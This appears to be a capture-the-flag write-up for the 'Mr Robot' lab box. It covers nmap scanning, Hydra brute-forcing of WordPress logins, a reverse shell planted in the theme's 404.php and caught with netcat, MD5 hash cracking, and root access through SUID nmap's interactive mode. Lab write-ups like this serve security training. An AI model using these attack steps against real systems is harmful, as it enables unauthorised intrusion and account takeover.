# Mr Robot
Find the 3 hidden flags

## Solution

ip=10.10.231.112
First, we scan the box using nmap

```
> nmap -sC -sV 10.10.231.112 -oN nmap-initial

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 23:57 CET
Nmap scan report for 10.10.231.112
Host is up (0.046s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

We know that port 80 is open. Let's visit it.  
Entering http://10.10.231.112 we have a terminal. 

As a first step we study the different commands the terminal provides. 
Using the _join_ command we then get asked to provide an email. We can set up a temporary mail and give it. Seems a void feature, no messages are sent to the provided email.  
We start looking in other directions.


The name of the box is Mr Robot. Visiting the robot.txt file we get 
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
Now with http://10.10.231.112/key-1-of-3.txt we get the first flag

Visiting https.//10.10.231.112/fsocity.dic we can download a txt file. Presumibely, it's a dictionary file we can use to bruteforce some logins

Running gobuster to scan hidden directories
```
gobuster dir -u http://10.10.231.112 -t 64 -w /usr/share/wordlists/rockyou.txt
```

I continued the challenge on a second day. New ip=10.10.33.211

In http://10.10.33.111/wp-login.php we have a login form. We try to login as admin, bruteforcing the password using using Hydra and the fsocity.dic as wordlist file but it doesn't work.  
So, first we notice that Wordpress gives indication whether the username is correct or not. We use the provided dictionary to bruteforce the login name. Namely:
```
> hydra -L fsocity.dic -p password 10.10.33.211 -v http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:invalid username' 

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-21 22:26:25
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.33.211:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:invalid username
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-post-form] host: 10.10.33.211   login: Elliot   password: password
```

We know that a user Elliot exists. Now we can bruteforce the password:
```
> hydra -l Elliot -P fsocity.dic 10.10.33.211 -v http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username'
```
Once we get the password we can log in.

Once logged in, we can gain access to the underlying host by uploading a reverse shell in Appearence -> Editor.  
Uploading the code in the 404.php, the script will be executed every time the 404 page is triggered.  
We have now the reverse shell.

```
>nc -lnvp 1234
listening on [any] 1234 ...
10.10.37.252: inverse host lookup failed: Unknown host
connect to [10.9.80.140] from (UNKNOWN) [10.10.37.252] 51988
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 18:24:06 up  1:05,  0 users,  load average: 0.00, 0.01, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```

We can stabilize the shell using python.
```
python -c 'import pty; pty.spawn("/bin/bash")'
```


Navigating in the home of robot, we get a username and a md5 hash:
```
daemon@linux:/home/robot$ cat pass
cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

We crack it using the CraskStation and we get the password.  
We can use the password to login in robot account.

In /home/robot we also find the second flag.
One flag remaining now.


We enumerate the binaries with SUID, discarding the errors (Permission Denied):
```
find / -user root -perm -4000 2>/dev/null
```

In GTFObins we find how to exploit this misconfiguration and become root.
```
nmap --interactive
nmap> !sh
```

Navigating in /root we find the third and last key.
